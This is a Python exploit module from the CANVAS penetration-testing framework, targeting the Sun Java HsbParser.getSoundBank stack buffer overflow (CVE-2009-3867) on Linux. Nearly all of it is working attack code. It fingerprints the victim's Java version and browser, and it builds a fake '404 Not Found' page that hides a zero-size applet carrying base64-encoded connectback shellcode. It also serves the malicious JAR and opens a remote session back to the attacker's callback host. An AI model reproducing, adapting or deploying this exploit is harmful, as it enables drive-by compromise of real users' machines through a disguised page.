##ImmunityHeader v1 
###############################################################################
## File       :  sun_java_hsbparser_linux.py
## Description:  
##            :  
## Created_On :  Sun Dec 27 14:12:12 2009
## Created_By :  Justin Seitz
## Modified_On:  Thu Jan  7 07:33:36 2010
## Modified_By:  Justin Seitz
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import time
import base64

if '.' not in sys.path:
    sys.path.append('.')
    
from exploitutils import *
from tcpexploit import *
from encoder import *
from internal import devlog

import canvasengine
import shellcodeGenerator
from engine.config import canvas_resources_directory
import os.path

from httpclientside import httpclientside

NAME = 'sun_java_hsbparser_linux'
DESCRIPTION = 'Sun Java HsbParser.getSoundBank Stack Buffer Overflow Vulnerability'
DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = 'Sun'
DOCUMENTATION['URL'] = 'http://seclists.org/bugtraq/2009/Nov/37'
DOCUMENTATION['CVE Name'] = 'CVE-2009-3867'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-3867'

VERSION="0.4"

PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['TYPE'] = "Exploit"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [
    "Java SE JDK, JRE 5.0 < Update 22",
    "Java JDK, JRE 6 < Update 17,",
    "Java SDK, JRE 1.3.x < 1.3.1_27",
    "Java SDK, JRE 1.4.x < 1.4.2_24"
]

PROPERTY['DELIVERY'] = 'HTTP'

   
DEBUG_NOTES="""
On Linux when debugging firefox a new Java process will be spawned when you hit 
the applet. So you'll want to debug this, and not the firefox itself.
"""

class theexploit(httpclientside):
    def __init__(self):        
        httpclientside.__init__(self)
        self.name=NAME
        self.htmlfile           = "index.html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.jarfile            = "HSBSiteError_Linux.jar"
        return 
    
    def is_vulnerable( self, info_dict ):
        """
        Check to see if we have the right Java version for this exploit.
        We also check to see if they are running Linux.
        """
        import re
        if "Java" in info_dict['plugins']:
            java          = info_dict['plugins']['Java']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, java )
            
            # If there's no match it will throw an exception
            try:
                java_version  = match.group(0)
            except:
                return 0
            
            version_list = java_version.split(".")
            major = int(version_list[0])
            minor = int(version_list[1])
            build = int(version_list[2])
            try:
                patch = int(version_list[3])
            except IndexError:
                patch = 0
            
            if "Linux" in info_dict['user_agent']:
                devlog("clientd", "Linux is in User_Agent: %s"%str(info_dict['user_agent']))
                if major == 1:            
                    if minor == 6:
                        if patch < 17:                    
                            # We know this beast is vulnerable
                            return 10
                    if minor == 5:
                        if build == 0:
                            if patch < 22:
                                return 10
                    if minor == 3:
                        if build <= 1:
                            if patch < 27:
                                return 10
                    
                    if minor == 4:
                        if build <= 2:
                            if patch < 24:
                                return 10
        devlog("clientd", "Session is not vulnerable to %s"%self.name)
        return 0 

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]
        
    def test(self):
        """ is supposed to test for vuln but not exploit it """
        return
    
    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        return
    
    def createShellcode(self): 
        self.createLinuxUniversalShellcode()

        return self.shellcode
    
    def makefile(self):
        shellcode = self.createShellcode()
        
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body onload="foo();">
            <script type="text/javascript">
            function reload() {
               window.location = "/done";
            }
            function foo() {
               setTimeout('reload()', 5000);
            }
            </script>
                <!-- Site 404 Handler Applet -->
                <applet code='HSBSiteError_Linux', archive = '%s', width="0", 
                height="0">
                    <param name="error" value="%s">                    
                </applet>
                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.jarfile,\
               base64.b64encode(shellcode),
               self.htmlfile) 
        self.log("HTML created to send connectback to %s:%d" % 
                 (self.callback.ip, 
                  self.callback.port))
        return html    

    def makedownloadfile(self):
        """
        Returns the byte array of the data we need to exploit the target.
        In this case, a Linux-centric Jar file.
        """
        
        jarname = os.path.join(canvas_resources_directory,
                               "sun_java_hsbparser", "HSBSiteError_Linux.jar")
        data = file(jarname, 'rb').read()
        self.log("JAR length: %s"%len(data))
        
        return data 
    
    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        self.log("[+] User agent of connecting host: %s" % user_agent)        
        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())   
        elif clientheader.URL.count(self.jarfile):
            self.log("[+] Sending JAR")
            data = self.makedownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)
        elif clientheader.URL.count("done"):
            self.log("We're done and the exploit failed...returning None")
            return None, None 
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')            

        return h,b
    
    def run(self):
        self.host = self.target.interface

        self.htmlfile = self.argsDict.get('htmlfile', self.htmlfile)
        self.jarfile = self.argsDict.get('jarfile', self.jarfile)
        
        html = self.makefile()
        jar = self.makedownloadfile()

        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = file(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)
        
        self.log("[+] Opening JAR %s for output" % self.jarfile)
        fd = file(self.jarfile, 'wb+')
        fd.write(jar)
        fd.close()
        self.log("[+] Wrote to %s" % self.jarfile)

        self.log("[+] Place both files together in malicious webroot")        
        return 1
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

